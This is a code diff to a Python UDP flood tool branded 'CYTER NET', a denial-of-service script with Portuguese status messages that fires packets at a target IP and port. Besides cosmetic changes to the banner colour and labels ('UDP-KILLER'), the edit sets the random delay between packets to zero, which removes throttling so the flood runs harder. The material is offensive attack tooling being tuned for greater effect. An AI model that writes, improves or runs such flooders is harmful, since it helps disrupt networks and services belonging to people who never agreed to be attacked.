@@ -19,14 +19,14 @@ print_lock = threading.Lock()
 def print_banner():
     os.system('clear' if name != 'nt' else 'cls')
     banner = figlet_format("CYTER NET", font="big")
-    print(Fore.YELLOW + banner)
+    print(Fore.RED + banner)
 
 def clear_screen():
     os.system('clear' if name != 'nt' else 'cls')
 
 def print_attack_status(ip, port, protocol, ping, sent_packets):
     with print_lock:
-        print(Fore.YELLOW + f"[Cyter] Atack enviado: \033[0m{ip}:{port} - {protocol} \033[93m| Ping: \033[0m{ping}")
+        print(Fore.RED + f"Ataque enviado: \033[0m{ip}:{port} - UDP-KILLER \033[93m| Ping: \033[0m{ping}")
 
 def get_ping(ip):
     try:
@@ -38,7 +38,7 @@ def get_ping(ip):
         time_ms = output.split('time=')[-1].split('ms')[0]
         return time_ms
     except subprocess.CalledProcessError:
-        return '+999'
+        return 'off'
     except Exception as e:
         return f'Erro: {str(e)}'
 
@@ -55,7 +55,7 @@ def udp_flood(ip, port, duration=2000, min_size_mb=6, max_size_mb=10):
                 sent_packets += 1
                 ping = get_ping(ip)
                 print_attack_status(ip, port, 'UDP', ping, sent_packets)
-                time.sleep(random.uniform(0.01, 0.05))  # Random short pause
+                time.sleep(random.uniform(0.00, 0.00))  # Random short pause
         except Exception as e:
             with print_lock:
                 print(Fore.RED + f"[ERROR] {str(e)}")
